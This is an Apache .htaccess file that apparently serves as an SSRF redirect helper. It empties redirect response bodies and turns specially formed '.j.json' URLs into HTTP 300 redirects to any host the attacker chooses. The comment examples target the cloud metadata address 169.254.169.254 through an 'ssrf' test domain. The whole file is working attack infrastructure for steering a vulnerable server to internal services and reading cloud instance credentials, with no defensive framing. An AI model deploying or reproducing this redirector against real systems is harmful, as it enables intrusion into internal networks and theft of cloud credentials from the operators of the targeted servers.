# Set blank response body
ErrorDocument 300 " "
ErrorDocument 301 " "
ErrorDocument 302 " "
ErrorDocument 303 " "
ErrorDocument 305 " "
ErrorDocument 307 " "
ErrorDocument 308 " "

# 300 without response body
# https://ssrf.localdomain.pw/json-without-body/300-http-169.254.169.254:80-.j.json
# https://ssrf.localdomain.pw/json-without-body/300-http-169.254.169.254:80-test/.j.json
RewriteEngine on
RewriteCond %{REQUEST_URI} 300-([^/-]*)-([^/-]*)-(.*).j.json$
RewriteRule 300-([^/-]*)-([^/-]*)-(.*).j.json$ $1://$2/$3 [L,R=300,NC]

